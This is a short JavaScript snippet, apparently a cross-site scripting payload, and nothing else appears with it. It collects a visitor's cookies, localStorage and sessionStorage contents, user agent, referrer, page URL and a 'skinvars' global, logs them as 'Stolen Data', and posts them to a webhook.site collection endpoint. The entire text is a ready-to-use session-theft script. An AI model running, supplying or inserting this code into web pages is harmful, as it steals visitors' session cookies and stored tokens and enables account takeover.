(async () => {
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    location: location.href,
    skinvars: window.skinvars
  };

  console.log("🔥 Stolen Data:", data);

  fetch("https://webhook.site/xxxxxx", {
    method: "POST",
    body: JSON.stringify(data)
  });
})();
